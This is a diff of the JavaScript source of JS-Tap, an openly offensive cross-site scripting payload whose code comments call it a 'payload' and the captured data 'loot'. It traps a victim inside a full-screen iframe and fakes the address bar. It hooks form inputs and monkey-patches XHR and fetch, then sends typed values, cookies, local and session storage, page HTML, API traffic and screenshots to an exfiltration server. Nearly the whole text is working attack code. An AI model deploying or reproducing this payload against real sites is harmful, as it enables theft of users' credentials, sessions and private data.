@@ -12,10 +12,37 @@ var r=function(A,e){return(r=Object.setPrototypeOf||{__proto__:[]}instanceof Arr
 
 
 // *******************************************************************************
-// JS-Tap below
+// JS-Tap code below
+
+// This is free and unencumbered software released into the public domain.
+
+// Anyone is free to copy, modify, publish, use, compile, sell, or
+// distribute this software, either in source code form or as a compiled
+// binary, for any purpose, commercial or non-commercial, and by any
+// means.
+
+// In jurisdictions that recognize copyright laws, the author or authors
+// of this software dedicate any and all copyright interest in the
+// software to the public domain. We make this dedication for the benefit
+// of the public at large and to the detriment of our heirs and
+// successors. We intend this dedication to be an overt act of
+// relinquishment in perpetuity of all present and future rights to this
+// software under copyright law.
+
+// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
+// EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
+// MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
+// IN NO EVENT SHALL THE AUTHORS BE LIABLE FOR ANY CLAIM, DAMAGES OR
+// OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE,
+// ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR
+// OTHER DEALINGS IN THE SOFTWARE.
+
+// For more information, please refer to <http://unlicense.org/>
+
+//
 function initGlobals()
 {
-	console.log("Initializing globals...");
+	// console.log("Initializing globals...");
 
 
 	// Create our own XHR/Fetch that won't get modified by monkeyPatching
@@ -30,12 +57,13 @@ function initGlobals()
 	// like adding directly to the javascript
 	// on the application server. 
 	// Setting: trap or implant
-	window.taperMode = "implant";
+	window.taperMode = "trap";
 
 	// Exfil server
 	window.taperexfilServer = "https://127.0.0.1:8444";
 
 
+	// Below settings only matter if you're in trap mode
 	if (window.taperMode === "trap")
 	{
 		// Use fullscreen for actual prod usage
@@ -58,8 +86,8 @@ function initGlobals()
 		// load the page the user was on in the iframe
 		// when they reloaded the page. Otherwise,
 		// they'll start here
-		//window.taperstartingPage = "http://targetapp.localdemo/wp-admin";
-		window.taperstartingPage = "https://127.0.0.1:8443/";
+		window.taperstartingPage = "http://targetapp.localdemo/wp-admin";
+		//window.taperstartingPage = "https://127.0.0.1:8443/";
 	}
 	else // if implant mode
 	{
@@ -69,7 +97,7 @@ function initGlobals()
 
 		window.addEventListener("beforeunload", function()
 		{
-			console.log("**** Unloading page, removing payload loaded flag...");
+			// console.log("**** Unloading page, removing payload loaded flag...");
 			sessionStorage.removeItem("taperSystemLoaded");
 		});
 	}
@@ -82,19 +110,18 @@ function initGlobals()
 	
 
 	// Should we try to monkey patch underlying API prototypes?
-	window.monkeyPatchAPIs = true;
+	window.monkeyPatchAPIs = false;
 
 
 	// Should we capture a screenshot after a delay after an API call?
 	// The data that came back from the API call might have been used to update
 	// the UI. Delay is in milliseconds
+	// Only used when monkeyPatchAPIs is true
 	window.postApiCallScreenshot = true;
 	window.screenshotDelay       = 1000;
 
 
 	// Helpful variables
-	// window.taperlastFakeUrl = "";
-
 	if (!sessionStorage.hasOwnProperty('taperLastUrl'))
 	{
 		sessionStorage.setItem('taperLastUrl', '');
@@ -109,24 +136,20 @@ function initGlobals()
 	{
 		sessionStorage.setItem('taperSessionUUID', '');
 	}
-	// window.taperSessionUUID = "";
 
 	// Cookie storage
-	// window.tapercookieStorageDict = {};
 	if (!sessionStorage.hasOwnProperty('taperCookieStorage'))
 	{
 		sessionStorage.setItem('taperCookieStorage', '');
 	}
 
 	// Local storage
-	// window.taperlocalStorageDict = {};
 	if (!sessionStorage.hasOwnProperty('taperLocalStorage'))
 	{
 		sessionStorage.setItem('taperLocalStorage', '');
 	}
 
 	// Session storage
-	// window.tapersessionStorageDict = {};
 	if (!sessionStorage.hasOwnProperty('taperSessionStorage'))
 	{
 		sessionStorage.setItem('taperSessionStorage', '');
@@ -135,100 +158,22 @@ function initGlobals()
 
 
 
-function loadHtml2Canvas()
-{
-	console.log("** Loading html2canvas");
-	// Pull in html2canvas
-	var js = document.createElement("script");
-	js.type = "text/javascript";
-	js.src = taperexfilServer + "/lib/telemhelperlib.js";
-
-	// this.temp_define = window['define'];
-	document.head.appendChild(js);
-	// window['define'] = undefined;
-
-	js.onload = function ()
-	{
-		console.log("Sending magic onload screenshot");
-		sendScreenshot()
-	}
-}
-
 
 
 function canAccessIframe(iframe) {
 	try {
-		console.log("Trying to access iframe contentDocument...");
+		// console.log("Trying to access iframe contentDocument...");
 		var retValue = Boolean(iframe.contentDocument);
 
-		console.log("Return value would be: " + retValue);
+		// console.log("Return value would be: " + retValue);
 		return Boolean(iframe.contentDocument);
 	}
 	catch(e){
-		console.log("canAccessIframe returning false...");
+		// console.log("canAccessIframe returning false...");
 		return false;
 	}
 }
 
-
-
-// Snag a screenshot and ship it
-function sendScreenshot_bak()
-{
-	alert('SendScreenshot call...');
-	if (taperloaded == false)
-	{
-		console.log("!!! Waiting 1 second to init html2canvas!");
-		setTimeout(function () {}, 1000);
-		taperloaded = true;
-	}
-	console.log("---Snagging screenshot...");
-
-	var myReferences = "";
-
-	if (window.taperMode === "trap")
-	{
-		myReference = document.getElementById('iframe_a').contentDocument;
-	}
-	else
-	{
-		myReference = document;
-	}
-
-	// html2canvas(document.getElementById("iframe_a").contentDocument.getElementsByTagName("html")[0], {scale: 1}).then(canvas => 
-	html2canvas(myReference.getElementsByTagName("html")[0], {scale: 1}).then(canvas => 
-	{
-		function responseHandler() 
-		{
-			console.log(this.responseText)
-		};
-
-		//console.log("About to send image....");
-		// request = new XMLHttpRequest();
-		request = new window.taperXHR();
-		request.noIntercept = true;
-		request.addEventListener("load", responseHandler);
-		request.open("POST", taperexfilServer + "/loot/screenshot/" + 
-			sessionStorage.getItem('taperSessionUUID'));
-
-
-		// Helps hide flashing of the page when clicking around
-		// Only relevant to trap mode. 
-		if (window.tapersetBackgroundImage  && window.taperMode === "trap")
-		{
-			document.body.style.backgroundImage = 'url('+canvas.toDataURL("image/png")+')';
-			document.body.style.backgroundRepeat = "no-repeat";
-			document.body.style.backgroundSize = "auto";
-		}
-
-
-		canvas.toBlob((blob) => 
-		{
-			const image = blob;
-			request.send(image);
-		});
-	}).catch(e => console.log(e));
-}
 
 
 
@@ -237,15 +182,7 @@ function sendScreenshot()
 {
 	if (typeof html2canvas === "function")
 	{
-		// we should be good
-		alert('SendScreenshot call...');
-		// if (taperloaded == false)
-		// {
-		// 	console.log("!!! Waiting 1 second to init html2canvas!");
-		// 	setTimeout(function () {}, 1000);
-		// 	taperloaded = true;
-		// }
-		console.log("---Snagging screenshot...");
+		// console.log("---Snagging screenshot...");
 
 		var myReferences = "";
 
@@ -263,7 +200,7 @@ function sendScreenshot()
 		{
 			function responseHandler() 
 			{
-				console.log(this.responseText)
+				// console.log(this.responseText)
 			};
 
 			//console.log("About to send image....");
@@ -293,22 +230,6 @@ function sendScreenshot()
 		}).catch(e => console.log(e));
 
 	}
-	else
-	{
-		// html2canvas not defined
-		alert('html2canvas not loaded, loading and trying again');
-		// Pull in html2canvas
-		//loadHtml2Canvas();
-		// var js = document.createElement("script");
-		// js.type = "text/javascript";
-		// js.src = taperexfilServer + "/lib/telemhelperlib.js";
-
-		// this.temp_define = window['define'];
-		// document.body.appendChild(js);
-		// window['define'] = undefined;
-		// console.log("HTML2CANVAS added to DOM");
-		//sendScreenshot();
-	}
 }
 
 
@@ -333,7 +254,6 @@ function hookInputs()
 		myReference = document;
 	}
 
-	// inputs = document.getElementById("iframe_a").contentDocument.getElementsByTagName('input');
 	inputs = myReference.getElementsByTagName('input');
 	for (index = 0; index < inputs.length; index++)
 	{
@@ -343,7 +263,7 @@ function hookInputs()
 		// like a page change, but maybe the actual URL didn't change. 
 		if (inputs[index].getAttribute("tappedState") != "true")
 		{
-			console.log("!! Setting tappedState attribute on element index: " + index);
+			// console.log("!! Setting tappedState attribute on element index: " + index);
 			inputs[index].setAttribute("tappedState", "true");
 
 			// Adding event listeners to fire when the value in submitted 
@@ -351,7 +271,6 @@ function hookInputs()
 			inputs[index].addEventListener("change", function(){
 				inputName = this.name;
 				inputValue = this.value;
-				// request = new XMLHttpRequest();
 				request = new window.taperXHR();
 				request.noIntercept = true;
 				request.open("POST", taperexfilServer + "/loot/input/" + 
@@ -378,10 +297,7 @@ function checkCookies()
 	cookieArray = document.cookie.split(';');
 	for (index = 0; index < cookieArray.length; index++)
 	{
-		// console.log("++ Cookie loop: " + index);
 		cookieData = cookieArray[index].split('=');
-		// console.log("cookieName: " + cookieData[0]);
-		// console.log("cookieValue: " + cookieData[1]);
 
 		cookieName = cookieData[0];
 		cookieValue = cookieData[1];
@@ -397,7 +313,6 @@ function checkCookies()
 		}
 
 
-
 		var cookieDict = {};
 		if (sessionStorage.getItem('taperCookieStorage').length > 0)
 		{
@@ -409,14 +324,11 @@ function checkCookies()
 				if (cookieDict[cookieName] != cookieValue)
 				{
 					// Existing cookie, but the value has changed
-					// console.log("     New cookie value: " + cookieValue);
-					// console.log("     Old cookie value: " + cookieStorageDict[cookieName]);
 					cookieDict[cookieName] = cookieValue;
 				}
 				else
 				{
 					// Existing cookie, but no change in value to report
-					// console.log("     Cookie value unchanged");
 					continue;
 				}
 			}
@@ -431,7 +343,6 @@ function checkCookies()
 
 
 		// Ship it
-		// request = new XMLHttpRequest();
 		request = new window.taperXHR();
 		request.noIntercept = true;
 		request.open("POST", taperexfilServer + "/loot/dessert/" + 
@@ -457,8 +368,6 @@ function checkLocalStorage()
 	{
 		key   = localStorage.key(index)
 		value = localStorage.getItem(key)
-		//console.log("~~~ Local storage: {" + key + ", " + value + "}");
-
 
 		var localStorageDict = {};
 
@@ -473,21 +382,17 @@ function checkLocalStorage()
 				if (localStorageDict[key] != value)
 				{
 					// Existing localStorage, but the value has changed
-					// console.log("     New localStorage value: " + value);
-					// console.log("     Old localStorage value: " + localStorageDict[key]);
 					localStorageDict[key] = value;
 				}
 				else
 				{
 					// Existing cookie, but no change in value to report
-					//console.log("     localStorgae value unchanged");
 					continue;
 				}
 			}
 		}
 
 		// New localStorage entry
-		//console.log("++ New localStorage: " + key + ", with value: " + value);
 		localStorageDict[key] = value;
 
 		// Copy dictionary back to session storage
@@ -498,7 +403,6 @@ function checkLocalStorage()
 
 
 		// Ship it
-		// request = new XMLHttpRequest();
 		request = new window.taperXHR();
 		request.noIntercept = true;
 		request.open("POST", taperexfilServer + "/loot/localstore/" + 
@@ -524,7 +428,6 @@ function checkSessionStorage()
 	{
 		key = sessionStorage.key(index)
 		value = sessionStorage.getItem(key)
-		// console.log("~~~ Session storage: {" + key + ", " + value + "}");
 
 
 		if (key === "taperSessionStorage" || 
@@ -555,8 +458,6 @@ function checkSessionStorage()
 				if (sessionStorageDict[key] != value)
 				{
 					// Existing localStorage, but the value has changed
-					// console.log("     New sessionStorage value: " + value);
-					// console.log("     Old sessionStorage value: " + sessionStorageDict[key]);
 					sessionStorageDict[key] = value;
 				}
 				else
@@ -567,17 +468,9 @@ function checkSessionStorage()
 				}
 			}
 		}
-		// else
-		// {
-		// 	console.log("+++ In else statement for taperSessionStorage length check...");
-		// }
-
-		// console.log("XXXX Wrapping up Session storage: {" + key + ", " + value + "}");
 
 		sessionStorageDict[key] = value;
 
-		// console.log("!!!! About to set session storage value to: " + JSON.stringify(sessionStorageDict))
-		// console.log("Length of dict is: " + sessionStorageDict.length);
 		if (Object.keys(sessionStorageDict).length > 0)
 		{
 			sessionStorage.setItem('taperSessionStorage', JSON.stringify(sessionStorageDict));
@@ -585,7 +478,6 @@ function checkSessionStorage()
 
 
 		// Ship it
-		// request = new XMLHttpRequest();
 		request = new window.taperXHR();
 		request.noIntercept = true;
 		request.open("POST", taperexfilServer + "/loot/sessionstore/" + 
@@ -608,18 +500,17 @@ function sendHTML()
 
 	if (window.taperMode === "trap")
 	{
-		myReference = document.getElementById("iframe_a");
+		myReference = document.getElementById("iframe_a").contentDocument;
 	}
 	else
 	{
 		myReference = document;
 	}
 
-	trapURL  = myReference.contentDocument.location.href;
-	trapHTML = myReference.contentDocument.documentElement.outerHTML;
+	trapURL  = myReference.location.href;
+	trapHTML = myReference.documentElement.outerHTML;
 
 
-	// request = new XMLHttpRequest();
 	request = new window.taperXHR();
 	request.noIntercept = true;
 	request.open("POST", taperexfilServer + "/loot/html/" + 
@@ -663,7 +554,7 @@ function captureUrlChangeLoot()
 // iframe trap, not the one with the XSS vuln. 
 function runUpdate()
 {
-	console.log("*** Top of runUpdate...");
+	// console.log("*** Top of runUpdate...");
 	var currentUrl = "";
 	var fullUrl = "";
 
@@ -688,13 +579,13 @@ function runUpdate()
 			// First click exits the iframe, reloads the normally. 
 			// Second click will properly load the external page. 
 			// Sad to lose the trap through. 
-			console.log("iFrame access lost, loading page: " + sessionStorage.getItem('taperLastUrl'));
+			// console.log("iFrame access lost, loading page: " + sessionStorage.getItem('taperLastUrl'));
 			window.location = sessionStorage.getItem('taperLastUrl');
 		}
-		else
-		{
-			console.log("Looks like canAccessIframe check passed!");
-		}
+		// else
+		// {
+		// 	console.log("Looks like canAccessIframe check passed!");
+		// }
 
 		currentUrl = document.getElementById("iframe_a").contentDocument.location.pathname;
 		fullUrl    = document.getElementById("iframe_a").contentDocument.location.href;
@@ -710,11 +601,11 @@ function runUpdate()
 	if (sessionStorage.getItem('taperLastUrl') != currentUrl)
 	{
 		// Handle URL recording
-		console.log("New trap URL, stealing the things: " + fullUrl);
+		// console.log("!!!!!!!! New trap URL, stealing the things: " + fullUrl);
 		sessionStorage.setItem('taperLastUrl', currentUrl);
 
 
-				// This needs an API call to report the new page
+		// This needs an API call to report the new page
 		// and take a screenshot maybe, not sure if
 		// screenshot timing will be right yet
 		// request = new XMLHttpRequest();
@@ -739,7 +630,6 @@ function runUpdate()
 
 				// Fake the URL that the user sees. 
 				// This is important for iFrame trap mode. 
-				console.log("In upper address bar spoof, current url is: " + currentUrl);
 				if (currentUrl != 'blank')
 				{
 					window.history.replaceState(null, '', currentUrl);
@@ -750,9 +640,8 @@ function runUpdate()
 		}
 		else
 		{
-			document.onload = function() {
-				captureUrlChangeLoot();
-			}
+			// console.log("$$ implant mode capturelUrlChangeLoot branch..");
+			captureUrlChangeLoot();
 		}
 	}
 
@@ -781,7 +670,6 @@ function runUpdate()
 	if (window.taperMode === "trap")
 	{
 		// Fake the URL that the user sees. This is important. 
-		console.log("In lower address bar spoof, current url is: " + currentUrl);
 		if (currentUrl != 'blank')
 		{
 			window.history.replaceState(null, '', currentUrl);
@@ -826,16 +714,16 @@ function customFetch(url, options)
 
 	if (this.noIntercept)
 	{
-		console.log("$$$$$ Skipping fetch intercept");
+		// console.log("$$$$$ Skipping fetch intercept");
 		return;
 	}
 
-	console.log("** Cloned Fetch API call**");
-	console.log("Fetch url: " + url);
-	console.log("Fetch method: " + options.method);
-	console.log("Fetch headers: " + JSON.stringify(options.headers));
-	console.log("Fetch body: " + options.body);
-	console.log("----------");
+	// console.log("** Cloned Fetch API call**");
+	// console.log("Fetch url: " + url);
+	// console.log("Fetch method: " + options.method);
+	// console.log("Fetch headers: " + JSON.stringify(options.headers));
+	// console.log("Fetch body: " + options.body);
+	// console.log("----------");
 
 	// send setup loot
 	request = new XMLHttpRequest();
@@ -853,7 +741,7 @@ function customFetch(url, options)
 	for (const key in options.headers)
 	{
 		const value = options.headers[key];
-		console.log("**** " + key, value);
+		// console.log("**** " + key, value);
 
 		// send header loot
 		request = new XMLHttpRequest();
@@ -872,16 +760,16 @@ function customFetch(url, options)
 	// Let's get the API call good stuff
 	const requestBody = options.body;
 
-	console.log("### About to clone request...");
+	// console.log("### About to clone request...");
 
 	// Clone request
 	// return fetch(url, options).then((response) => {
 	return originalFetch(url, options).then((response) => {
 		// clone response
 		return response.clone().text().then((body) => {
-			console.log('Response Status:', response.status);
-			console.log('Response Headers:', response.headers);
-			console.log('Response Body:', body);
+			// console.log('Response Status:', response.status);
+			// console.log('Response Headers:', response.headers);
+			// console.log('Response Body:', body);
 
 			// send API call body loot
 			request = new XMLHttpRequest();
@@ -932,12 +820,13 @@ function monkeyPatchXHR()
 
 
 	//Monkey patch open
+	// XHR monkeypatch only stable in trap mode
 	document.getElementById("iframe_a").contentWindow.XMLHttpRequest.prototype.open = function(method, url, async, user, password) 
 	{
 		var method = arguments[0];
 		var url = arguments[1];
 
-		console.log("Intercepted XHR open: " + method + ", " + url);
+		// console.log("Intercepted XHR open: " + method + ", " + url);
 
 
 		// send loot
@@ -965,7 +854,7 @@ function monkeyPatchXHR()
 
 		// console.log("$$$ MonekeyURL: " + this.url);
 
-		console.log("Intercepted Header = " + header + ": " + value);
+		// console.log("Intercepted Header = " + header + ": " + value);
 
 
 		request = new XMLHttpRequest();
@@ -986,7 +875,7 @@ function monkeyPatchXHR()
   	// Monkey patch send
 	document.getElementById("iframe_a").contentWindow.XMLHttpRequest.prototype.send = function(data) 
 	{
-		console.log("Intercepted request body: " + data);
+		// console.log("Intercepted request body: " + data);
 
 		var requestBody = btoa(data);
 
@@ -1016,7 +905,7 @@ function monkeyPatchXHR()
 
 				var responseBody = btoa(data);
 				// var response = read_body(this);
-				console.log("Intercepted response: " + data);
+				// console.log("Intercepted response: " + data);
 
 				request = new XMLHttpRequest();
 				request.open("POST", taperexfilServer + "/loot/xhrCall/" + sessionStorage.getItem('taperSessionUUID'));
@@ -1047,9 +936,7 @@ function monkeyPatchXHR()
 
 function monkeyPatchFetch()
 {
-	// console.log("## Starting fetch monkey patching");
 	// Fetch API monkey patching
-	// const originalFetch = window.fetch;
 	getFetchReference().fetch = customFetch;
 }
 
@@ -1063,7 +950,7 @@ function takeOver()
 
 	if (window.taperMode === "trap")
 	{
-		console.log("Starting iFrame Trap");
+		// console.log("Starting iFrame Trap");
 
 		// Setup our iframe trap
 		var iframe = document.createElement("iframe");
@@ -1072,7 +959,7 @@ function takeOver()
 
 		if (taperfullscreenIframe)
 		{
-			console.log("&& Using fullscreen");
+			// console.log("&& Using fullscreen");
 			iframe.style.width  = "100%";
 			iframe.style.height = "100%";
 			iframe.style.top = "0px";
@@ -1080,7 +967,7 @@ function takeOver()
 		}
 		else
 		{
-			console.log("&& Using partial screen");
+			// console.log("&& Using partial screen");
 			iframe.style.width  = "80%";
 			iframe.style.height = "80%";
 			iframe.style.top = "50px";
@@ -1094,9 +981,9 @@ function takeOver()
 		// we'll call runUpdate()
 		var myReference = document.getElementById('iframe_a').contentDocument;
 	}
-	else
+	else // implant mode
 	{
-		console.log("Starting implant mode!");
+		// console.log("Starting implant mode!");
 		myReference = document;
 	}
 
@@ -1165,19 +1052,6 @@ if (sessionStorage.getItem('taperSystemLoaded') != "true")
 						document.body.outerHTML = "";
 					}
 
-					// // Pull in html2canvas
-					// var js = document.createElement("script");
-					// js.type = "text/javascript";
-					// js.src = taperexfilServer + "/lib/telemhelperlib.js";
-
-
-					// this.temp_define = window['define'];
-					// document.body.appendChild(js);
-					// window['define'] = undefined;
-					// console.log("HTML2CANVAS added to DOM");
-
-
-
 					var jsonResponse = JSON.parse(request.responseText);
 					sessionStorage.setItem('taperSessionUUID', jsonResponse.clientToken);
 
@@ -1185,33 +1059,24 @@ if (sessionStorage.getItem('taperSystemLoaded') != "true")
     				// We're ready to trap all the things now
 					takeOver();
 				}
-				else
-				{
-					console.log("No client session received, skipping");
-				}
+				// else
+				// {
+				// 	console.log("No client session received, skipping");
+				// }
 			}
 		}
 	}
 	else
 	{
-		console.log("*** taperSessionUUID not null, not requesting a new one: " + sessionStorage.getItem('taperSessionUUID'));
-		// Pull in html2canvas
-		// var js = document.createElement("script");
-		// js.type = "text/javascript";
-		// js.src = taperexfilServer + "/lib/telemhelperlib.js";
-
-		// this.temp_define = window['define'];
-		// document.body.appendChild(js);
-		// window['define'] = undefined;
-		// console.log("HTML2CANVAS added to DOM");
+		// console.log("*** taperSessionUUID not null, not requesting a new one: " + sessionStorage.getItem('taperSessionUUID'));
 
 		takeOver();
 		sendScreenshot();
 	}
 }
-else
+else // payload already loaded
 {
-	console.log("++++++ Already loaded payload!");
+	//console.log("++++++ Already loaded payload!");
 }
 
 
